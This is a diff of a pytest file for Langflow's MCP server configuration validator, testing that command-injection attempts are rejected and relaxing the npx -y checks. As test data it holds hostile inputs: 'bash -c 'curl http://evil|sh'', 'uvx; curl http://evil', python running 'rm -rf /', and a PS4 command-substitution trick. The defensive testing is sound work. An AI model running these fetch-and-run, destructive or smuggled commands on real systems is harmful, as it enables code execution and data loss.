@@ -12,7 +12,8 @@ in MCPServerConfig schema.
 """
 
 import pytest
-from langflow.api.v2.schemas import ALLOWED_MCP_COMMANDS, DANGEROUS_ENV_VARS, MCPServerConfig
+from langflow.api.v2.schemas import MCPServerConfig
+from lfx.base.mcp.security import ALLOWED_MCP_COMMANDS, DANGEROUS_ENV_VARS
 from pydantic import ValidationError
 
 
@@ -61,9 +62,9 @@ class TestMCPCommandInjectionSecurity:
         """Test that shell wrappers (cmd/sh/bash) are allowed when wrapping safe commands."""
         # These should all pass validation
         valid_configs = [
-            MCPServerConfig(command="cmd", args=["/c", "uvx", "mcp-server"]),
+            MCPServerConfig(command="cmd", args=["/C", "uvx", "mcp-server"]),
             MCPServerConfig(command="sh", args=["-c", "npx @modelcontextprotocol/server"]),
-            MCPServerConfig(command="bash", args=["-c", "python -m mcp_server"]),
+            MCPServerConfig(command="bash", args=["-lc", "python -m mcp_server"]),
             MCPServerConfig(command="cmd", args=["/c", "node", "server.js"]),
         ]
 
@@ -98,6 +99,7 @@ class TestMCPCommandInjectionSecurity:
             ("python", ["-c", "import os; os.system('rm -rf /')"]),
             ("python3", ["-c", "malicious code"]),
             ("node", ["-c", "require('child_process').exec('evil')"]),
+            ("python", ["-Lc", "import os"]),
         ]
 
         for cmd, args in dangerous_c_usage:
@@ -123,6 +125,26 @@ class TestMCPCommandInjectionSecurity:
 
         config = MCPServerConfig(command="python -m mcp_server", args=None)
         assert config.command == "python -m mcp_server"
+
+    def test_command_packed_payload_with_empty_args_rejected(self):
+        """A payload packed entirely into the command string (empty args) must be rejected.
+
+        Regression for the bypass where the command/args checks only inspected `args`: a tenant
+        set command="bash -c '<payload>'" with args=[] and reached `bash -c "exec ..."`. The
+        command is now tokenized so the embedded payload is subject to all checks.
+        """
+        packed = [
+            "bash -c 'curl http://evil|sh'",
+            "sh -c id",
+            "bash -c rm",
+            "python -c import os",
+            "uvx; curl http://evil",
+        ]
+        for cmd in packed:
+            with pytest.raises(ValidationError):
+                MCPServerConfig(command=cmd, args=[])
+            with pytest.raises(ValidationError):
+                MCPServerConfig(command=cmd, args=None)
 
     def test_command_injection_via_semicolon_rejected(self):
         """Test that command injection via semicolon is rejected."""
@@ -395,21 +417,19 @@ class TestMCPCommandInjectionSecurity:
 
     # ==================== Npx/Uvx Auto-Install Prevention ====================
 
-    def test_npx_auto_install_flag_rejected(self):
-        """Test that npx -y (auto-install) flag is rejected."""
-        with pytest.raises(ValidationError) as exc_info:
-            MCPServerConfig(command="npx", args=["-y", "@malicious/package"])
+    def test_npx_auto_install_flag_accepted(self):
+        """Test that npx -y is accepted as a package-manager safe flag."""
+        config = MCPServerConfig(command="npx", args=["-y", "@modelcontextprotocol/server-everything"])
 
-        error_msg = str(exc_info.value)
-        assert "not allowed" in error_msg.lower()
+        assert config.command == "npx"
+        assert config.args == ["-y", "@modelcontextprotocol/server-everything"]
 
-    def test_npx_yes_flag_rejected(self):
-        """Test that npx --yes (auto-install) flag is rejected."""
-        with pytest.raises(ValidationError) as exc_info:
-            MCPServerConfig(command="npx", args=["--yes", "@malicious/package"])
+    def test_npx_yes_flag_accepted(self):
+        """Test that npx --yes is accepted as a package-manager safe flag."""
+        config = MCPServerConfig(command="npx", args=["--yes", "@modelcontextprotocol/server-filesystem"])
 
-        error_msg = str(exc_info.value)
-        assert "not allowed" in error_msg.lower()
+        assert config.command == "npx"
+        assert config.args == ["--yes", "@modelcontextprotocol/server-filesystem"]
 
     # ==================== Subshell Metacharacter Tests ====================
 
@@ -580,7 +600,12 @@ class TestMCPCommandInjectionSecurity:
         assert "not allowed" in error_msg.lower()
 
     def test_shellopts_ps4_trace_env_rejected(self):
-        """Test that SHELLOPTS/PS4 env vars are rejected (bash xtrace prompt command substitution)."""
+        """Test that SHELLOPTS/PS4 env vars are rejected (bash xtrace prompt command substitution).
+
+        SHELLOPTS/BASHOPTS can enable bash xtrace mode where PS4 is evaluated as a command,
+        allowing arbitrary code execution via $(command) substitution in the prompt.
+        For example: PS4='$(malicious_command)' enables command injection when xtrace is active.
+        """
         with pytest.raises(ValidationError) as exc_info:
             MCPServerConfig(
                 command="python3",
